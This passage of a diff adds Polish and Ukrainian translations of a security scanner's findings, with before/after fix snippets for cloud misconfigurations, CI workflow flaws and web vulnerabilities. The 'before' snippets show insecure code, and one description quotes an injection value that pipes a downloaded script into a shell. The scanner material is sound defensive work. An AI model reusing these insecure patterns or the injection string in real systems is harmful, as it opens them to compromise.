+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # tylko twoja prywatna sieć albo bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Reguła sieciowa Azure otwiera wrażliwy port na cały internet",
+    description:
+      'Reguła zabezpieczeń sieciowych ("azurerm_network_security_rule" lub blok "security_rule" wewnątrz "azurerm_network_security_group") z "source_address_prefix" ustawionym na "*" lub "0.0.0.0/0", kierunkiem "Inbound" i dostępem "Allow", blisko wrażliwego portu — SSH (22), RDP (3389) lub typowego portu bazy danych. Każdy w internecie może spróbować połączyć się z tą usługą, nie tylko ten, kto powinien.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # tylko twoja prywatna sieć albo bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Sekret jest zapisany jako domyślna wartość zmiennej Terraform",
+    description:
+      'Zmienna o nazwie typu password/secret/token/key ma wartość literalną w swoim "default". W przeciwieństwie do wartości przekazywanej w czasie wykonania (tfvars, zmienne środowiskowe TF_VAR_*), wartość domyślna trafia do kodu źródłowego — a jeśli repozytorium jest współdzielone lub publiczne, każdy ją widzi, nawet bez dostępu do stanu Terraform.',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # brak wartości domyślnej: należy przekazać przez plik .tfvars (poza gitem) lub zmienną środowiskową TF_VAR_db_password\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "Wartość kontrolowana przez zewnętrznego użytkownika trafia bezpośrednio do polecenia shell w CI",
+    description:
+      'Polecenie "run:" w workflow GitHub Actions bezpośrednio interpoluje wartość taką jak tytuł pull requesta, nazwa brancha lub tekst komentarza — wszystkie zapisywalne przez każdego, kto otworzy pull request lub komentarz, nawet z zewnętrznego forka. Wartość taka jak `"; curl malware.sh | sh #` wykonałaby dowolne polecenia w CI, z dostępem do wszystkich sekretów dostępnych w tym workflow.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # przekazywane jako zmienna środowiskowa, nigdy interpolowane bezpośrednio w poleceniu`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflow uruchamia kod zewnętrznego pull requesta z dostępem do sekretów repozytorium",
+    description:
+      'Workflow używa "pull_request_target" — który działa z uprawnieniami i sekretami repozytorium bazowego nawet dla pull requesta otwartego z niepowiązanego forka — i wykonuje checkout kodu samego pull requesta ("github.event.pull_request.head"), a nie brancha bazowego. Osoba otwierająca pull request faktycznie uzyskuje uruchomienie własnego kodu z dostępem do tych sekretów.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Wykonuje checkout brancha bazowego, a nie kodu PR — albo użyj\n      # "pull_request" zamiast "pull_request_target", jeśli nie potrzebujesz\n      # szerszych uprawnień/sekretów.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Dane żądania są deserializowane w formacie, który może wykonać kod",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) lub biblioteka node-serialize (Node) deserializują wartość pobraną bezpośrednio z żądania. W przeciwieństwie do JSON, te formaty mogą reprezentować i wykonywać kod podczas samej deserializacji — osoba kontrolująca wysłaną wartość może uzyskać wykonanie dowolnego kodu na serwerze.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON nigdy nie wykonuje kodu podczas parsowania, w przeciwieństwie do pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'Kod jawnie akceptuje niepodpisane tokeny JWT (algorytm "none")',
+    description:
+      '"none" pojawia się wśród algorytmów akceptowanych do weryfikacji tokenu JWT. Token z algorytmem "none" nie ma żadnego podpisu do zweryfikowania: każdy może zbudować taki token z dowolną zawartością (np. rolą administratora), a kod zaakceptuje go jako prawidłowy.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nigdy nie dodawaj "none" do akceptowanych algorytmów`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "Nowa tabela wygląda na utworzoną bez zabezpieczenia",
+    description:
+      "Migracja SQL tworzy tabelę, ale nie włącza Row Level Security dla tej samej tabeli w tym samym pliku. Dopóki tak pozostaje, tabela powstaje bez żadnego ograniczenia dotyczącego tego, kto może ją odczytywać lub do niej zapisywać.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "Witryna akceptuje żądania z dowolnej innej witryny",
+    description:
+      "Nagłówek CORS jest ustawiony tak, by akceptować żądania z dowolnego źródła (*), albo middleware cors() jest używany bez ograniczeń. Dowolna witryna osób trzecich może wywoływać twoje API z przeglądarki już uwierzytelnionego użytkownika.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://twojawitryna.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "Funkcja z uprawnieniami administratora nie sprawdza, kto jej używa",
+    description:
+      "Trasa lub funkcja, której nazwa sugeruje operacje administracyjne, nie zawiera w pobliskich liniach żadnego sprawdzenia uwierzytelniania ani roli. Każdy, kto zna URL, mógłby ją uruchomić.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "Witrynę można zmusić do wykonania zewnętrznego kodu",
+    description:
+      "Wychodzące żądanie HTTP (fetch, axios) bezpośrednio używa wartości pochodzącej z żądania użytkownika jako docelowego URL. Złośliwy użytkownik może zmusić twój serwer do wywoływania wewnętrznych lub dowolnych adresów — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.twojausluga.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL niedozwolony")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Hasła są chronione metodą, którą łatwo teraz złamać",
+    description:
+      "W tej samej linii, md5() lub sha1() są stosowane do wartości powiązanej z hasłem. Te algorytmy są zbyt szybkie do obliczenia: atakujący z bazą danych może wypróbować miliardy haseł na sekundę.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Kontener w manifeście Kubernetes jest ustawiony tak, by działać jako root",
+    description:
+      '"runAsUser: 0" lub "runAsNonRoot: false" w securityContext jawnie wymuszają uruchomienie kontenera jako root. Jeśli atakujący zdoła uruchomić kod w kontenerze (np. wykorzystując podatną bibliotekę), bycie rootem w kontenerze ułatwia ewentualną ucieczkę do hosta lub szerszy wpływ.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kontener w manifeście Kubernetes może zyskać więcej uprawnień niż miał na starcie",
+    description:
+      '"allowPrivilegeEscalation: true" w securityContext pozwala procesowi wewnątrz kontenera zyskać więcej uprawnień niż proces, który go uruchomił (np. przez binarkę z bitem setuid). W połączeniu z podatnością w aplikacji to kolejny krok w stronę wykonania kodu z większymi uprawnieniami niż zamierzone.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Pod w manifeście Kubernetes współdzieli sieć, procesy lub pamięć współdzieloną hosta",
+    description:
+      '"hostNetwork", "hostPID" lub "hostIPC" ustawione na true wyprowadzają pod poza jego normalną izolację: hostNetwork wystawia pod w sieci hosta (omijając polityki sieciowe klastra), hostPID daje mu widoczność wszystkich procesów na maszynie hosta, hostIPC daje mu dostęp do pamięci współdzielonej hosta. Prawie nigdy niepotrzebne dla zwykłej aplikacji — typowo tylko dla niskopoziomowych narzędzi systemowych/monitorujących.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access jest wyłączone na buckecie S3 zdefiniowanym w Terraform",
+    description:
+      'Jedna lub więcej z czterech zabezpieczeń w "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) jest ustawiona na false. Nie oznacza to, że bucket jest już publiczny, ale usuwa siatkę bezpieczeństwa, która zapobiegałaby przypadkowemu upublicznieniu go w przyszłości.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Polityka IAM zdefiniowana w Terraform przyznaje pełny dostęp",
+    description:
+      'Statement z akcją "*" i zasobem "*" przyznaje pełny dostęp do każdej usługi i zasobu AWS — to samo sprawdzenie wykonywane już na żywym stanie IAM, tutaj odczytywane bezpośrednio z kodu jeszcze przed jego zastosowaniem. Może to być zamierzone dla roli awaryjnej, ale warto to potwierdzić: do codziennego użytku przyznawaj tylko naprawdę potrzebne uprawnienia.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::twoj-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Bucket Google Cloud Storage jest udostępniony do odczytu każdemu",
+    description:
+      'Zasób "google_storage_bucket_iam_member" lub "google_storage_bucket_iam_binding" przyznaje rolę "allUsers" lub "allAuthenticatedUsers" — pierwsza sprawia, że bucket jest czytelny dla każdego w internecie, nawet bez konta Google; druga dla każdego z dowolnym kontem Google, a nie tylko dla tych, którzy powinni mieć dostęp.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:ktos@example.com"  # tylko ten, kto naprawdę powinien mieć dostęp, nie allUsers/allAuthenticatedUsers\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Publiczny dostęp do blobów jest włączony na koncie magazynu Azure",
+    description:
+      '"allow_blob_public_access" jest ustawione na true na "azurerm_storage_account": każdy, kto zna URL udostępnionego publicznie bloba/kontenera, może go odczytać, bez żadnego uwierzytelniania.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "Rola IAM Google Cloud przyznaje pełny dostęp (Owner/Editor)",
+    description:
+      '"google_project_iam_binding"/"google_project_iam_member" (lub odpowiednik na poziomie organizacji/folderu) przypisuje podstawową rolę "roles/owner" lub "roles/editor" — niemal pełny dostęp do każdej usługi w projekcie. Może to być zamierzone dla konta awaryjnego, ale warto to potwierdzić: do codziennego użytku przyznawaj tylko bardziej szczegółowe, predefiniowane role, które są naprawdę potrzebne.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # tylko predefiniowana rola, która jest naprawdę potrzebna, nie roles/owner\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Przypisanie roli Azure przyznaje pełny dostęp (Owner)",
+    description:
+      '"azurerm_role_assignment" przypisuje rolę "Owner" — pełny dostęp, łącznie z kontrolą nad uprawnieniami innych użytkowników, w całym przypisanym zakresie (subskrypcja, grupa zasobów...). Może to być zamierzone dla konta awaryjnego, ale warto to potwierdzić: do codziennego użytku przyznawaj tylko bardziej szczegółową rolę, która jest naprawdę potrzebna (np. "Contributor" na pojedynczej grupie zasobów).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # tylko bardziej szczegółowa rola, która jest naprawdę potrzebna, nie Owner na całej subskrypcji\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Token bezpieczeństwa jest generowany za pomocą generatora liczb losowych, który nie jest kryptograficznie bezpieczny",
+    description:
+      "Wartość o nazwie typu token/session/reset/otp/csrf jest generowana za pomocą Math.random() (JS), random.random() (Python) lub rand() (PHP) — generatorów nieprzeznaczonych do celów bezpieczeństwa, których sekwencje są przewidywalne. Token wygenerowany w ten sposób można odgadnąć lub zrekonstruować, co niweczy cel, dla którego istnieje (np. link do resetu hasła, który każdy mógłby przewidzieć).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, nie Math.random — nieprzewidywalne`,
+    },
+  },
+  "ldap-injection": {
+    title: "Filtr LDAP jest budowany przez bezpośrednią konkatenację wartości żądania",
+    description:
+      'Linia budująca filtr LDAP (np. "(uid=...)") bezpośrednio zawiera wartość pobraną z żądania, bez żadnego escapowania znaków specjalnych LDAP. Osoba kontrolująca tę wartość może zmienić logikę filtra — na przykład ominąć sprawdzenie uwierzytelniania lub odczytać dane katalogu, których nie powinna widzieć.',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // znaki specjalne LDAP zawsze trzeba escapować przed użyciem ich w filtrze\nclient.search(base, { filter });",
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Tekst napisany przez użytkowników mógłby wykonać kod w przeglądarce",
+    description:
+      "Treść jest wstawiana na stronę jako surowy HTML (dangerouslySetInnerHTML, v-html, .innerHTML) zamiast jako zwykły tekst. Jeśli ta treść zawiera dane wejściowe użytkownika, może zawierać skrypty, które wykonują się w przeglądarce osoby czytającej stronę.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// albo, jeśli potrzebny jest HTML: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "Przestrzeń na przesłane pliki jest widoczna dla każdego",
+    description:
+      "Bucket magazynu (Supabase Storage, S3) jest skonfigurowany jako publiczny. Jeśli zawiera dokumenty, zdjęcia lub pliki przesłane przez użytkowników, każdy, kto zna — lub odgadnie — ścieżkę, może uzyskać do nich dostęp bez uwierzytelniania.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// serwuj pliki za pomocą podpisanych URL-i ograniczonych czasowo: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Wystarczy jeden link, by usunąć lub zmienić dane",
+    description:
+      "Trasa GET wykonuje operację zmieniającą dane (ścieżka zawiera delete/remove/update/edit). Żądania GET wykonują się już przez samo odwiedzenie linku lub załadowanie obrazka z zewnętrznej witryny — to klasyczny punkt zaczepienia dla ataku CSRF.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Dane logowania zapisane w przeglądarce nie są dobrze zabezpieczone",
+    description:
+      "Token dostępu jest zapisywany w localStorage. W przeciwieństwie do ciasteczka httpOnly, dowolny skrypt uruchomiony na stronie (łącznie ze złośliwym, wstrzykniętym przez XSS) może go odczytać i wykraść.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// ustaw token jako ciasteczko httpOnly po stronie serwera:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "Witrynę można wykorzystać do przekierowania na fałszywą stronę",
+    description:
+      "Witryna przekierowuje użytkownika na adres pobrany bezpośrednio z żądania (query, body, params) bez sprawdzenia, czy jest to znana domena. Link, który wygląda, jakby prowadził do twojej witryny, może w rzeczywistości prowadzić do strony phishingowej.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "Zmiana liczby w adresie mogłaby pokazać cudze dane",
+    description:
+      "Zapytanie do bazy danych bezpośrednio używa identyfikatora pobranego z URL (req.params.id) bez sprawdzenia, w pobliskich liniach, czy należy on do użytkownika wysyłającego żądanie. Zmiana id w adresie mogłaby dać dostęp do danych innego użytkownika — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "Wartość żądania trafia bezpośrednio do nagłówka odpowiedzi HTTP",
+    description:
+      "Nagłówek odpowiedzi HTTP jest ustawiany wartością pobraną bezpośrednio z żądania (query, body, params), bez sprawdzenia, czy nie zawiera znaku nowej linii (CRLF). Atakujący może wstawić dodatkowe nagłówki lub nawet całkowicie inną odpowiedź — response splitting — co pozwala manipulować cache'em, ciasteczkami lub treścią pokazywaną innym użytkownikom.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfile nie ustawia użytkownika innego niż root",
+    description:
+      "Brak instrukcji USER w Dockerfile: bez niej kontener działa jako root. Jeśli atakujący zdoła uruchomić kod wewnątrz kontenera (np. wykorzystując podatną bibliotekę), bycie rootem w kontenerze ułatwia ewentualną ucieczkę do hosta lub szerszy wpływ na otaczający system.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Manifest Kubernetes jawnie nie wymusza uruchamiania jako użytkownik inny niż root",
+    description:
+      'Brak "runAsNonRoot" w manifeście (ani na poziomie poda, ani kontenera): bez jego ustawienia kontener działa jako użytkownik zdefiniowany w jego obrazie — często domyślnie root, jeśli sam obraz tego nie zmienił. Ustawienie go jawnie na true powoduje, że pod nie uruchomi się, jeśli obraz mimo wszystko próbuje działać jako root, zamiast odkryć to dopiero po incydencie.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "Zewnętrzna akcja CI nie jest przypięta do precyzyjnej wersji (commit SHA)",
+    description:
+      'Workflow używa zewnętrznej akcji wskazywanej przez tag lub branch (np. "@v1", "@main") zamiast przez commit SHA. Osoba ją utrzymująca — lub ktoś, kto przejmie jej konto — może w dowolnym momencie przenieść to odniesienie na inny commit, cicho zmieniając to, co działa w CI, z dostępem do jego sekretów. Commit SHA zawsze wskazuje dokładnie ten sam kod.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, przypięte do commit SHA — zaktualizuj SHA przy aktualizacji wersji`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflow przyznaje sobie wszystkie uprawnienia tokenu zamiast tylko tych, z których korzysta",
+    description:
+      '"permissions: write-all" przyznaje GITHUB_TOKEN workflow dostęp zapisu do wszystkiego — issues, pull requestów, pakietów, wdrożeń — nawet jeśli workflow korzysta tylko z części tego. Jeśli jeden z kroków workflow zostanie naruszony (złośliwa zależność, wstrzyknięty skrypt), te szersze uprawnienia zwiększają to, co może zrobić osoba, która to wykorzysta.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # tylko uprawnienia, z których workflow naprawdę korzysta`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "Ciasteczko sesji lub uwierzytelniania jest ustawione bez flag Secure i HttpOnly",
+    description:
+      'Ciasteczko o nazwie przypominającej session/auth/token jest ustawione bez "httpOnly" i "secure" wśród swoich opcji. Bez httpOnly, JavaScript na stronie — łącznie z kodem wstrzykniętym przez XSS — może to ciasteczko odczytać. Bez secure może też zostać wysłane przez nieszyfrowane połączenie HTTP.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Formularz logowania nie blokuje zbyt wielu prób z rzędu",
+    description:
+      "Trasa logowania jest zdefiniowana w pliku, ale nie ma śladu middleware'u rate-limiting w tym samym pliku. Bez limitu prób atakujący może kolejno próbować haseł (brute force) bez żadnego spowolnienia.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Hasła lub wrażliwe dane trafiają do logów",
+    description:
+      "Wywołanie console.log (lub podobne) zawiera zmienną o nazwie password, token, secret lub apiKey. Jeśli te logi trafią do zewnętrznej usługi lub pliku, wrażliwe dane pozostają widoczne znacznie dłużej niż to konieczne.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Obraz bazowy Dockerfile używa tagu ":latest"',
+    description:
+      'Instrukcja FROM jawnie używa tagu ":latest" zamiast precyzyjnej wersji. "latest" zmienia się w czasie: ten sam build, wykonany ponownie w innym momencie, może dostać inną wersję obrazu bazowego — niemożliwy do odtworzenia build, a niechciana aktualizacja może nadejść bez decyzji nikogo.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile pobiera zdalny plik za pomocą ADD zamiast COPY",
+    description:
+      "Instrukcja ADD z URL-em http/https pobiera plik z internetu podczas builda, bez sprawdzenia integralności i bez widoczności zawartości w repozytorium. Jeśli ten URL zostanie kiedyś naruszony, build wchłonie dowolną zawartość bez wiedzy kogokolwiek czytającego Dockerfile.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<oczekiwany hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Podatna zależność:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Nie jest jeszcze znana żadna poprawiona wersja — rozważ alternatywny pakiet lub śledź aktualizacje projektu."
+      ),
+    },
+  }),
+},
+  uk: {
+  "supabase-service-role-in-client": {
+    title: "Секретний ключ Supabase потрапляє у файл, призначений для браузера",
+    description:
+      "Змінна з публічним префіксом (напр. NEXT_PUBLIC_, VITE_) або файл на стороні клієнта посилається на service role key Supabase. Цей ключ обходить Row Level Security: якщо він потрапить у бандл браузера, будь-хто зможе прочитати його й діяти як адміністратор бази даних.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (лише сервер)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "У коді напряму прописані паролі або секретні ключі",
+    description:
+      "Ключ API, токен або пароль виглядають як буквальне значення, а не зчитуються зі змінної середовища. Будь-хто, хто прочитає вихідний код (або репозиторій, якщо він публічний), отримає цей секрет.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "Серед проаналізованих файлів є файл зі справжніми паролями проєкту",
+    description:
+      "Файл .env зі справжніми значеннями (а не .env.example) включено до аналізу. Якщо цей файл потрапить у репозиторій або публічний деплой, усі облікові дані, які він містить, стануть доступними.",
+    fix: {
+      before: `# .env (закомічено помилково)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (закомічено)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env залишається поза репозиторієм (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Будь-хто може читати або змінювати дані всіх користувачів",
+    description:
+      "Row Level Security вимкнено, або політика дозволяє доступ будь-кому (USING (true)) без перевірки, хто саме робить запит. Кожен автентифікований користувач — або навіть анонімний — може читати чи змінювати дані всіх інших.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "Значення, введене користувачем, вставляється напряму в запит до бази даних",
+    description:
+      "SQL-запит побудований шляхом конкатенації або прямої інтерполяції рядка замість використання параметрів. Якщо цей текст надходить (навіть опосередковано) від користувача, він може змінити сам запит — SQL injection.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Схоже, паролі не захищені",
+    description:
+      "Поле пароля зберігається так само, як прийшло із запиту, і у файлі не з'являється жодна функція хешування (bcrypt, argon2, scrypt). Якщо базу даних буде скомпрометовано, усі паролі одразу стануть придатними для використання.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Секрет, який використовується для підпису входів, прописаний у коді відкритим текстом",
+    description:
+      "Секрет, переданий у jwt.sign / jwt.verify (або змінна JWT_SECRET), є буквальним значенням у коді замість того, щоб братися зі змінної середовища. Будь-хто, хто його прочитає, може створити дійсні токени доступу для будь-якого користувача.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "Сервер можна змусити виконати зовнішні команди",
+    description:
+      "Функція, яка виконує системні команди (exec, execSync, spawn), отримує рядок, побудований через інтерполяцію або конкатенацію. Якщо частина цього рядка надходить від введених користувачем даних, той, хто його контролює, може виконати довільні команди на сервері.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "Файл на сервері можна прочитати або записати, обравши шлях ззовні",
+    description:
+      'Функція, яка читає, записує або надсилає файл, отримує шлях напряму зі значення запиту (query, body, params) без перевірки, що він залишається всередині дозволеної папки. Зловмисник може вставити "../", щоб вийти за межі очікуваної папки та прочитати або перезаписати довільні файли на сервері (напр. конфігураційний файл з обліковими даними).',
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Шлях не дозволено")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "Значення, введене користувачем, виконується як код усередині запиту MongoDB",
+    description:
